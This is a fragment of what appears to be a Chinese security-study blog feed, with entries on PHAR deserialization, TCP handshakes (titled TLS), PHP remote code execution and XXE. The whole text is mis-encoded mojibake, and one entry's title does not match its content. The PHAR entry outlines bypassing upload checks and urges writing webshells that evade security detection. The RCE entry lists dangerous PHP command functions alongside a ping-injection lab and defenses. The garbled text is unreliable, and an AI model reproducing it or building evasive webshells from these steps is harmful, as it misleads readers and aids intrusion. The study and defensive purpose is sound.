only)</code>,ç­¾åéƒ¨åˆ†</li></ul><p><strong>åˆ©ç”¨</strong></p><p>PHARæ–‡ä»¶çš„Meta-dataå¯ä»¥æ˜¯ä»»ä½•èƒ½å¤Ÿåºåˆ—åŒ–çš„PHPå¯¹è±¡ï¼Œå½“PHARæ–‡ä»¶è¢«ä»»ä½•æ–‡ä»¶ç³»ç»Ÿå‡½æ•°é¦–æ¬¡é€šè¿‡phar://åè®®è§£ææ—¶Meta-dataéƒ¨åˆ†ä¼šè¢«ååºåˆ—åŒ–</p><p>æ€è·¯ï¼š</p><p>1.åˆ›å»ºpharæ–‡ä»¶ï¼ˆ<strong>phar.readonly=Off</strong>ï¼‰</p><p>2.è®¿é—®phar.phpï¼Œåœ¨åŒç›®å½•ä¸‹ç”Ÿæˆphar.pharæ–‡ä»¶</p><p>3.ç¼–å†™ä»£ç åˆ©ç”¨phar://è§£æ<code>Meta-data</code></p><p>4.æ·»åŠ æ–‡ä»¶å¤´ã€ä¿®æ”¹åç¼€çš„æ–¹å¼ç»•è¿‡ä¸Šä¼ æ£€æµ‹(PHPä»…é€šè¿‡stubéƒ¨åˆ†åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºPHARæ–‡ä»¶)</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>å¤šå®æˆ˜ï¼Œæœ¬æ–‡è¿˜æ˜¯åç†è®ºï¼Œè¿˜è¦å¤šæ€è€ƒå¦‚ä½•ç¼–å†™å¯ä»¥éª—è¿‡å®‰å…¨æ£€æµ‹è½¯ä»¶çš„ğŸ~</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2202">PHPååºåˆ—åŒ–æ¼æ´ä¸Webshell</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html">å®æˆ˜ç»éªŒä¸¨PHPååºåˆ—åŒ–æ¼æ´æ€»ç»“</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TLS</title>
    <link href="/2021/02/13/TLS/"/>
    <url>/2021/02/13/TLS/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‰æ¬¡æ¡æ‰‹"><a class="header-anchor" href="#ä¸‰æ¬¡æ¡æ‰‹">ğŸ­</a>ä¸‰æ¬¡æ¡æ‰‹</h2><p>å¯¹æ¯æ¬¡å‘é€çš„æ•°æ®é‡è¿›è¡Œè·Ÿè¸ªä¸åå•†ï¼Œç¡®ä¿æ•°æ®æ®µçš„å‘é€å’Œæ¥æ”¶åŒæ­¥ï¼Œæ ¹æ®æ‰€æ¥æ”¶åˆ°çš„æ•°æ®é‡è€Œç¡®è®¤æ•°æ®å‘é€ã€æ¥æ”¶å®Œæ¯•åä½•æ—¶æ’¤æ¶ˆè”ç³»ï¼Œå¹¶å»ºç«‹è™šè¿æ¥ã€‚</p><p>TCPæ˜¯ä¸€ç§é¢å‘è¿æ¥çš„å•æ’­åè®®ï¼Œåœ¨å‘é€æ•°æ®å‰ï¼Œé€šä¿¡åŒæ–¹å¿…é¡»åœ¨å½¼æ­¤é—´å»ºç«‹ä¸€æ¡è¿æ¥ã€‚æ‰€è°“çš„â€œè¿æ¥â€ï¼Œå…¶å®æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„å†…å­˜é‡Œä¿å­˜çš„ä¸€ä»½å…³äºå¯¹æ–¹çš„ä¿¡æ¯ï¼Œå¦‚ipåœ°å€ã€ç«¯å£å·ç­‰ã€‚</p><p>ç¬¬ä¸€æ¬¡ï¼šå»ºç«‹è¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€synåŒ…ï¼ˆseq=jï¼‰åˆ°æœåŠ¡å™¨ï¼Œå¹¶è¿›å…¥SYN_SENTçŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨ç¡®è®¤ï¼›SYNï¼šåŒæ­¥åºåˆ—ç¼–å·ï¼ˆSynchronize Sequence Numbersï¼‰</p><p>ç¬¬äºŒæ¬¡ï¼šæœåŠ¡å™¨æ”¶åˆ°synåŒ…ï¼Œå¿…é¡»ç¡®è®¤å®¢æˆ·çš„SYNï¼ˆack=j+1ï¼‰ï¼ŒåŒæ—¶è‡ªå·±ä¹Ÿå‘é€ä¸€ä¸ªSYNåŒ…ï¼ˆseq=kï¼‰ï¼Œå³SYN+ACKåŒ…ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥SYN_RECVçŠ¶æ€ã€‚</p><p>ç¬¬ä¸‰æ¬¡ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYN+ACKåŒ…ï¼Œå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ACK(ack=k+1)ï¼Œæ­¤åŒ…å‘é€å®Œæ¯•ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥<a href="https://baike.baidu.com/item/ESTABLISHED">ESTABLISHED</a>ï¼ˆTCPè¿æ¥æˆåŠŸï¼‰çŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹</p><p><img src="/2021/02/13/TLS/3.png" alt="3"></p><p><strong>SYN_SENT:</strong></p><p>è¡¨ç¤ºå®¢æˆ·ç«¯å·²å‘é€SYNæŠ¥æ–‡,ä¸SYN_RCVDç›¸å‘¼åº”ï¼Œå½“å®¢æˆ·ç«¯SOCKETæ‰§è¡ŒCONNECTè¿æ¥æ—¶ï¼Œå®ƒé¦–å…ˆå‘é€SYNæŠ¥æ–‡ï¼Œéšå³è¿›å…¥SYN_SENTçŠ¶æ€ï¼Œå¹¶ç­‰å¾…ç¬¬2ä¸ªæŠ¥æ–‡ã€‚</p><p><strong>SYN_RCVD:</strong></p><p>è¡¨ç¤ºæ¥å—åˆ°äº†SYNæŠ¥æ–‡ï¼Œæ˜¯å¾ˆçŸ­æš‚çš„ä¸€ä¸ªä¸­é—´çŠ¶æ€ï¼ˆéš¾è§‚å¯Ÿåˆ°)åœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œæ”¶åˆ°å®¢æˆ·ç«¯çš„ACKæŠ¥æ–‡åï¼Œå®ƒä¼šå¿«é€Ÿè¿›å…¥ESTABLISHEDçŠ¶æ€</p><p><strong>ETABLISHED</strong></p><p>è¿æ¥å·²å»ºç«‹ã€‚</p><p>wiresharkæŠ“ç™¾åº¦çš„åŒ…éªŒè¯ä¸€ä¸‹</p><p><img src="/2021/02/13/TLS/1.jpg" alt="1"></p><p><code>14.215.177.39</code>æ˜¯ç™¾åº¦çš„æœåŠ¡å™¨</p><img src="/2021/02/13/TLS/2.jpg" alt="2" style="zoom:67%;"><h2 id="å››æ¬¡æŒ¥æ‰‹"><a class="header-anchor" href="#å››æ¬¡æŒ¥æ‰‹">ğŸ­</a>å››æ¬¡æŒ¥æ‰‹</h2><p>è¿æ¥ç»ˆæ­¢åè®®ã€‚TCPè¿æ¥æ˜¯å…¨åŒå·¥çš„ï¼Œå› æ­¤æ¯ä¸ªæ–¹å‘éƒ½å¿…é¡»å•ç‹¬è¿›è¡Œå…³é—­ã€‚è¿™åŸåˆ™æ˜¯å½“ä¸€æ–¹å®Œæˆå®ƒçš„æ•°æ®å‘é€ä»»åŠ¡åå°±èƒ½å‘é€ä¸€ä¸ªFINæ¥ç»ˆæ­¢è¿™ä¸ªæ–¹å‘çš„è¿æ¥ã€‚æ”¶åˆ°ä¸€ä¸ª  FINåªæ„å‘³ç€è¿™ä¸€æ–¹å‘ä¸Šæ²¡æœ‰æ•°æ®æµåŠ¨ï¼Œä¸€ä¸ªTCPè¿æ¥åœ¨æ”¶åˆ°ä¸€ä¸ªFINåä»èƒ½å‘é€æ•°æ®ã€‚é¦–å…ˆè¿›è¡Œå…³é—­çš„ä¸€æ–¹å°†æ‰§è¡Œä¸»åŠ¨å…³é—­ï¼Œè€Œå¦ä¸€æ–¹æ‰§è¡Œè¢«åŠ¨å…³é—­</p><ol><li><p>å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFINæ®µï¼Œå¹¶åŒ…å«ä¸€ä¸ªå¸Œæœ›æ¥æ”¶è€…çœ‹åˆ°çš„è‡ªå·±å½“å‰çš„åºåˆ—å·K. åŒæ—¶è¿˜åŒ…å«ä¸€ä¸ªACKè¡¨ç¤ºç¡®è®¤å¯¹æ–¹æœ€è¿‘ä¸€æ¬¡å‘è¿‡æ¥çš„æ•°æ®ã€‚</p></li><li><p>æœåŠ¡ç«¯å°†Kå€¼åŠ 1ä½œä¸ºACKåºå·å€¼ï¼Œè¡¨æ˜æ”¶åˆ°äº†ä¸Šä¸€ä¸ªåŒ…ã€‚è¿™æ—¶ä¸Šå±‚çš„åº”ç”¨ç¨‹åºä¼šè¢«å‘ŠçŸ¥å¦ä¸€ç«¯å‘èµ·äº†å…³é—­æ“ä½œï¼Œé€šå¸¸è¿™å°†å¼•èµ·åº”ç”¨ç¨‹åºå‘èµ·è‡ªå·±çš„å…³é—­æ“ä½œã€‚</p></li><li><p>æœåŠ¡ç«¯å‘èµ·è‡ªå·±çš„FINæ®µï¼Œ<code>ACK=K+1, Seq=L</code></p></li><li><p>å®¢æˆ·ç«¯ç¡®è®¤<code>ACK=L+1</code></p></li></ol><p><img src="/2021/02/13/TLS/5.png" alt="5"></p><p><strong>FIN_WAIT_1:</strong></p><p><code>FIN_WAIT_1</code>å’Œ<code>FIN_WAIT_2</code>éƒ½è¡¨ç¤ºç­‰å¾…å¯¹æ–¹çš„FINæŠ¥æ–‡ã€‚åŒºåˆ«æ˜¯FIN_WAIT_1çŠ¶æ€å®é™…ä¸Šæ˜¯å½“SOCKETåœ¨ESTABLISHEDçŠ¶æ€æ—¶ï¼Œå®ƒæƒ³ä¸»åŠ¨å…³é—­è¿æ¥ï¼Œå‘å¯¹æ–¹å‘é€äº†FINæŠ¥æ–‡ï¼Œæ­¤æ—¶è¯¥SOCKETå³è¿›å…¥åˆ°FIN_WAIT_1çŠ¶æ€ã€‚è€Œå½“å¯¹æ–¹å›åº”ACKæŠ¥æ–‡åï¼Œåˆ™è¿›å…¥åˆ°FIN_WAIT_2çŠ¶æ€ã€‚ä½†æ˜¯FIN_WAIT_1çŠ¶æ€æ¯”è¾ƒéš¾è§åˆ°(å› ä¸ºæ­£å¸¸æƒ…å†µä¸‹å¯¹æ–¹ä¼šé©¬ä¸Šå›åº”ACKæŠ¥æ–‡)ã€‚</p><p><strong>FIN_WAIT_2:</strong></p><p><code>FIN_WAIT_2</code>çŠ¶æ€ä¸‹çš„<code>SOCKET</code>ï¼Œè¡¨ç¤ºåŠè¿æ¥(æœ‰ä¸€æ–¹è¦æ±‚closeè¿æ¥ï¼Œä½†æš‚æ—¶è¿˜æœ‰æ•°æ®éœ€è¦ä¼ é€ï¼‰</p><p><strong>TIME_WAIT:</strong></p><p>è¡¨ç¤ºæ”¶åˆ°äº†å¯¹æ–¹çš„FINæŠ¥æ–‡ï¼Œå¹¶å‘é€å‡ºACKæŠ¥æ–‡ï¼Œä¸¤ä¸ªæœ€å¤§ç”Ÿå­˜æœŸåå³å¯å›åˆ°åŸå§‹çŠ¶æ€ã€‚<strong>å¦‚æœFIN_WAIT_1çŠ¶æ€ä¸‹ï¼Œæ”¶åˆ°äº†å¯¹æ–¹åŒæ—¶å¸¦FINæ ‡å¿—å’ŒACKæ ‡å¿—çš„æŠ¥æ–‡å¯ä»¥ç›´æ¥è¿›å…¥åˆ°<code>TIME_WAIT</code>çŠ¶æ€ï¼Œè€Œæ— é¡»ç»è¿‡<code>FIN_WAIT_2</code></strong></p><p><strong>CLOSE_WAIT:</strong></p><p>è¡¨ç¤ºåœ¨ç­‰å¾…å…³é—­ï¼Œæ­¤çŠ¶æ€ä¸‹éœ€æŸ¥çœ‹æ˜¯å¦è¿˜æœ‰æ•°æ®å‘é€ç»™å¯¹æ–¹ï¼Œè‹¥æ— å³å¯å…³é—­è¿æ¥ã€‚</p><p><strong>LAST_ACK:</strong></p><p>åœ¨è¢«åŠ¨å…³é—­ä¸€æ–¹åœ¨å‘é€FINæŠ¥æ–‡åï¼Œç­‰å¾…å¯¹æ–¹çš„ACKæŠ¥æ–‡ã€‚</p><p><strong>å»ºç«‹è¿æ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå…³é—­è¿æ¥éœ€è¦å››æ¬¡æŒ¥æ‰‹çš„åŸå› ï¼š</strong></p><p>æœåŠ¡ç«¯åœ¨LISTENçŠ¶æ€ï¼ˆæœåŠ¡å™¨ç«¯çš„æŸä¸ªSOCKETå¤„äºç›‘å¬çŠ¶æ€ï¼Œå¯æ¥å—è¿æ¥ï¼‰ä¸‹ï¼Œæ”¶åˆ°å»ºç«‹è¿æ¥è¯·æ±‚çš„SYNæŠ¥æ–‡åï¼ŒæŠŠACKå’ŒSYNæ”¾åœ¨ä¸€ä¸ªæŠ¥æ–‡é‡Œå‘é€ç»™å®¢æˆ·ç«¯ã€‚è€Œå…³é—­è¿æ¥æ—¶ï¼Œå½“æ”¶åˆ°å¯¹æ–¹çš„FINæŠ¥æ–‡æ—¶ï¼Œä»…ä»…è¡¨ç¤ºå¯¹æ–¹ä¸å†å‘é€æ•°æ®äº†ä½†æ˜¯è¿˜èƒ½æ¥æ”¶æ•°æ®(ä¸Šå›¾æœ‰è®²)ï¼Œå·±æ–¹æ˜¯å¦ç°åœ¨å…³é—­å‘é€æ•°æ®é€šé“ï¼Œéœ€è¦ä¸Šå±‚åº”ç”¨æ¥å†³å®šã€‚</p><p>ä»¥ä¸Šå¤šä¸ªçŠ¶æ€å¯ä»¥åœ¨wiresharkå¯ä»¥å¾—åˆ°éªŒè¯ï¼Œä¸ä¸€ä¸€æˆªå›¾è¾½ğŸ‘»ğŸ‘»ğŸ‘»</p><p>å‚è€ƒï¼š<a href="https://baike.baidu.com/item/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/7794287?fr=aladdin">ç™¾åº¦ç™¾ç§‘</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE</title>
    <link href="/2021/02/13/RCE/"/>
    <url>/2021/02/13/RCE/</url>
    
    <content type="html"><![CDATA[<h1>RCE</h1><p>è¿œç¨‹è¿æ¥å‘½ä»¤/ä»£ç æ‰§è¡Œæ¼æ´ï¼Œèƒ½å¤Ÿè®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹å†™å…¥æœåŠ¡å™¨ç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><h2 id="äº§ç”ŸåŸå› "><a class="header-anchor" href="#äº§ç”ŸåŸå› ">ğŸ­</a>äº§ç”ŸåŸå› </h2><ul><li><p>è¿œç¨‹è¿æ¥å‘½ä»¤æ‰§è¡Œping</p><p>åº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚å½“è®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤æ¶æ„å‘½ä»¤è®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚</p></li><li><p>è¿œç¨‹ä»£ç æ‰§è¡Œevelå‘½ä»¤æœ¨é©¬</p><p>åå°æœ‰æ—¶å€™ä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†æ²¡æœ‰åšè¿‡æ»¤ç›´æ¥æ‰§è¡Œä»è€Œé€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p></li></ul><h2 id="å±é™©å‡½æ•°"><a class="header-anchor" href="#å±é™©å‡½æ•°">ğŸ­</a>å±é™©å‡½æ•°</h2><ul><li><p><code>evalï¼ˆ)</code></p><p>æŠŠå­—ç¬¦ä¸²å½“ PHP ä»£ç æ‰§è¡Œï¼Œè¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯ PHP ä»£ç ï¼Œä¸”ä»¥åˆ†å·ç»“å°¾ã€‚</p><p>åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼š</p><img src="/2021/02/13/RCE/5.jpg" alt="5" style="zoom:50%;"></li><li><p><code>preg_replace</code></p></li><li><p><code>create_function</code></p></li><li><p><code>array_map</code></p></li><li><p><code>call_user_fu</code></p></li><li><p><code>nc</code></p></li><li><p><code>assert()</code></p><p>åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ï¼Œä¸eval()ç±»ä¼¼ã€‚ä¸è¿‡eval($code_str)åªæ‰§è¡Œç¬¦åˆphpç¼–ç è§„èŒƒçš„$code_strã€‚</p></li><li><p><code>call_user_func_array</code></p></li><li><p><code>array_filter</code></p></li><li><p><code>uasor</code></p></li><li><p><code>proc_popen</code></p></li><li><p><code>passthru()</code></p><p>è°ƒç”¨å‘½ä»¤ï¼Œè¾“å‡ºè¿”å›æ‰§è¡Œç»“æœã€‚æµ‹è¯•ï¼š</p><img src="/2021/02/13/RCE/6.jpg" alt="6" style="zoom:67%;"></li><li><p><code>systemï¼ˆï¼‰</code></p><p>æ ¼å¼ï¼š</p><blockquote><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$shell_return</span>)</span></span></code></pre></blockquote><blockquote><blockquote><p>$shell: æ˜¯shellå‘½ä»¤, å¦‚â€™netstat -tnlpâ€™</p></blockquote></blockquote><blockquote><blockquote><p>$shell_return: shellå‘½ä»¤æ‰§è¡Œçš„è¿”å›ç»“æœ,å‘½ä»¤æ‰§è¡ŒæˆåŠŸè¿”å›0, å¦åˆ™ä¸ä¸º0</p></blockquote></blockquote><blockquote><blockquote><p>è¯¥å‡½æ•°æ‰§è¡Œå,ç›´æ¥åœ¨ç»ˆç«¯çª—å£æ‰“å°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p></blockquote></blockquote><blockquote><blockquote><p>å‡½æ•°çš„è¿”å›å€¼æ˜¯å‘½ä»¤çš„æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œ</p></blockquote></blockquote><p>åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼š</p><img src="/2021/02/13/RCE/4.jpg" alt="4" style="zoom: 50%;"></li><li><p><code>execï¼ˆï¼‰</code></p><p>æ ¼å¼ï¼š</p><pre><code class="hljs smali">exec (string command [, string<span class="hljs-built_in"> array </span>[,<span class="hljs-built_in"> int </span>return_var]])</code></pre><p>exec()å‡½æ•°ä¸system()ç±»ä¼¼ï¼Œä¹Ÿæ‰§è¡Œç»™å®šçš„å‘½ä»¤ï¼Œä½†ä¸è¾“å‡ºç»“æœï¼Œè€Œæ˜¯è¿”å›ç»“æœçš„æœ€åä¸€è¡Œã€‚è™½ç„¶å®ƒåªè¿”å›å‘½ä»¤ç»“æœçš„æœ€åä¸€è¡Œï¼Œä½†ç”¨ç¬¬äºŒä¸ªå‚æ•°arrayå¯ä»¥å¾—åˆ°å®Œæ•´çš„ç»“æœï¼Œæ–¹æ³•æ˜¯æŠŠç»“æœé€è¡Œè¿½åŠ åˆ°arrayçš„ç»“å°¾å¤„ã€‚æµ‹è¯•ï¼š</p><img src="/2021/02/13/RCE/7.jpg" alt="7" style="zoom:67%;"></li><li><p><code>shell_exec</code></p><p>ä¸execç›¸ä¼¼ï¼Œä½†shell_execè¿”å›å…¨éƒ¨ä¿¡æ¯ã€‚</p></li><li><p><code>pcntl_exec</code></p></li></ul><h2 id="æ¼æ´å±å®³"><a class="header-anchor" href="#æ¼æ´å±å®³">ğŸ­</a>æ¼æ´å±å®³</h2><ul><li>è¿œç¨‹è¿æ¥å‘½ä»¤</li><li>ä»£ç æ‰§è¡Œææƒ</li><li>è·å–éšç§˜æ•°æ®</li><li>ä»»æ„æ–‡ä»¶ä¸Šä¼ </li><li>å†™å…¥æœ¨é©¬åé—¨æ–‡ä»¶webshell</li></ul><h2 id="æ¼æ´å®è·µ"><a class="header-anchor" href="#æ¼æ´å®è·µ">ğŸ­</a>æ¼æ´å®è·µ</h2><ul><li><p>è¿œç¨‹è¿æ¥å‘½ä»¤æ‰§è¡Œping</p><p>æˆ‘ä»¬åœ¨ã€Šcommand injectionã€‹æ‰§è¡Œè¿‡äº†è¿™é‡Œä¸¾ä¸ªä¾‹å­å°±å¥½ï¼Œä¸å†èµ˜è¿°ã€‚</p><img src="/2021/02/13/RCE/1.jpg" alt="1" style="zoom:67%;"><p>æŸ¥çœ‹åå°æºç </p><p><img src="/2021/02/13/RCE/3.jpg" alt="3"></p><p>è¾“å…¥çš„å‘½ä»¤æ²¡æœ‰å¤„ç†ï¼Œç›´æ¥æ‰§è¡Œï¼Œæ–‡ä»¶å¼¹å‡ºã€‚</p></li><li><p>è¿œç¨‹ä»£ç æ‰§è¡Œevelå‘½ä»¤æœ¨é©¬</p></li></ul><p>â€‹      è¿™ä¸ªåœ¨ä¹‹å‰çš„ä¸€å¥è¯æœ¨é©¬ä¹Ÿä»‹ç»ä¸€å¤§åŠäº†</p><p>â€‹      <code>phpinfo();</code></p><img src="/2021/02/13/RCE/8.jpg" alt="8" style="zoom:67%;"><p>â€‹      åå°ä»£ç ï¼š</p><p><img src="/2021/02/13/RCE/2.jpg" alt="2"></p><p>è¾“å…¥ä»£ç æ— è¿‡æ»¤ï¼Œç›´æ¥æ‰§è¡Œã€‚</p><h2 id="RCEé˜²å¾¡"><a class="header-anchor" href="#RCEé˜²å¾¡">ğŸ­</a>RCEé˜²å¾¡</h2><ul><li>é’ˆå¯¹å±é™©å‡½æ•°ï¼Œåº”è¯¥åœ¨å±é™©å‡½æ•°ä»£ç å‰å†™å¥½é»‘åå•è¿‡æ»¤ç‰¹æ®Šç¬¦å·ï¼Œæˆ–ä½¿ç”¨ disable_function ç­‰æ‰‹æ®µ</li><li>é’ˆå¯¹å‘½ä»¤æ³¨å…¥ï¼Œå°½é‡ä¸ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œå¦‚æœå¿…é¡»ä½¿ç”¨åˆ™å¯¹ç”¨æˆ·è¾“å…¥éƒ¨åˆ†åŠ ä¸Šå¼•å·ï¼Œè½¬ä¹‰è¾“å…¥åå†æ¸²æŸ“</li><li>å¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥</li></ul><p>RCEæ¼æ´æ›´å¤šçš„æ˜¯éœ€è¦å®æˆ˜çš„ä¸­çš„é»‘ç›’/ç™½ç›’æµ‹è¯•ï¼Œæœ¬æ–‡åªæ˜¯æ¢³ç†äº†åŸºç¡€çŸ¥è¯†ï¼Œç­‰ä»¥åæ¥è§¦åˆ°å†ç»†è®²è¾½~</p><p>ğŸ­ğŸ­ğŸ­ğŸ­<img src="/2021/02/13/RCE/9.png" alt="9"></p><p>å‚è€ƒï¼š<a href="https://www.sinesafe.com/article/20200305/rcebug.html">ä»€ä¹ˆæ˜¯RCEæ¼æ´ï¼Ÿå¦‚ä½•å¯¹å…¶è¿›è¡Œä¿®å¤åŠ å›ºé˜²å¾¡çš„åŠæ³•</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/02/10/XXE/"/>
    <url>/2021/02/10/XXE/</url>
    
    <content type="html"><![CDATA[<p>åœ¨BWAPPé‡ŒåšSSRFç»“æœä»»åŠ¡é‡Œå‡ºç°äº†XXEï¼Œåˆæ˜¯ä¸€ä¸ªçŸ¥è¯†ç›²åŒºğŸ‘¿ ğŸ‘¿ ğŸ‘¿ ï¼Œæ•…åˆè·‘æ¥XXEè¾½ğŸ‘»ğŸ‘»ğŸ‘»</p><h1>XXE</h1><p><code>XML External Entity</code>ï¼ŒXML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼šåº”ç”¨ç¨‹åºåœ¨è§£æXMLæ—¶æ²¡æœ‰è¿‡æ»¤å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´åŠ è½½äº†æ¶æ„çš„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ‰§è¡Œå‘½ä»¤ã€è¯»å–æ–‡ä»¶ã€æ‰«æå†…ç½‘ã€æ”»å‡»å†…ç½‘åº”ç”¨ç­‰å±å®³ã€‚</p><h2 id="XML"><a class="header-anchor" href="#XML">ğŸ­</a>XML</h2><p>XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ã€‚ä¾‹:</p><p><img src="/2021/02/10/XXE/1.png" alt="1"></p><p>å®é™…ä¸ŠXMLè¿˜åŒ…æ‹¬<code>PCDATA</code>,<code>CDATA</code>æ¨¡å—:</p><p><strong>PCDATA</strong></p><p>è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆ<code>parsed character data</code>ï¼‰,ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚</p><p><strong>CDATA</strong></p><p>å­—ç¬¦æ•°æ®ï¼ˆ<code>character data</code>ï¼‰,ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚å½“æœ‰äº›å†…å®¹ä¸æƒ³è®©è§£æå¼•æ“è§£ææ‰§è¡Œåªæ˜¯å½“åšåŸå§‹çš„å†…å®¹å¤„ç†æ—¶ï¼Œç”¨äºæŠŠæ•´æ®µæ•°æ®è§£æä¸ºçº¯å­—ç¬¦æ•°æ®è€Œä¸æ˜¯æ ‡è®°çš„æƒ…å†µåŒ…å«å¤§é‡çš„ &lt;&gt; &amp; æˆ–è€… &quot; å­—ç¬¦ï¼ŒCDATAèŠ‚ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«å½“åšå…ƒç´ å­—ç¬¦æ•°æ®çš„å¸¸é‡éƒ¨åˆ†ã€‚</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs xml">&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt;</code></pre><p>ä½œç”¨ï¼šå½“æŸä¸ªæ ‡ç­¾å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…ä¸ç¡®å®šå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ CDATAåŒ…è£¹ã€‚</p><p><strong>DTD</strong></p><p>æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)å¯ä»¥æ˜¯å†…éƒ¨å£°æ˜ä¹Ÿå¯ä»¥å¼•ç”¨å¤–éƒ¨DTD:</p><ul><li>å†…éƒ¨å£°æ˜DTDæ ¼å¼ï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></li><li>å¤–éƒ¨å¼•ç”¨DTDæ ¼å¼ï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM&quot;æ–‡ä»¶å&quot;&gt;</code></li><li>å¼•ç”¨å…¬å…±DTD:<code>&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC &quot;DTDæ ‡è¯†å&quot; 